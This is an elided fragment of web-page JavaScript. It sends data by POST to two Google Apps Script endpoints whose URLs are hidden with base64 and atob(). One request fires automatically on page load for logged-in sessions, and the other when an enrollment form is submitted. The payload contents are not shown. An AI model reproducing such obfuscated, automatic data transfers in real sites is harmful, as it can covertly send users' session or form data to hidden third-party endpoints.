...
document.addEventListener("DOMContentLoaded", () => {
  ...
  if (activeSession && document.documentElement.classList.contains('is-logged-in')) {
    ...
    fetch(atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J4cVgyWmp2MTNHa01JUjNCclBudDBQZTNKUHV6NnkxYUo2YVM1dWlmcnV6ZnJtaGFuNktBRVVsLWxXMkQ2UTd2ZC0vZXhlYw=="), {
      method: "POST",
      body: JSON.stringify({
  ...
  if (els.enrollForm) {
    els.enrollForm.addEventListener("submit", async (e) => {
      ...
      try {
        const response = await fetch(atob("aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J5Y2s3cEJSQ1dlc2VlbjdTa1Y0bnRrZ2pSbVo0SWVwT093V1hxNzVwazNXYkpRbkZyVlZUVi02Rm1Cb3l1bGxuVDQvZXhlYw=="), { method: "POST", body: data });
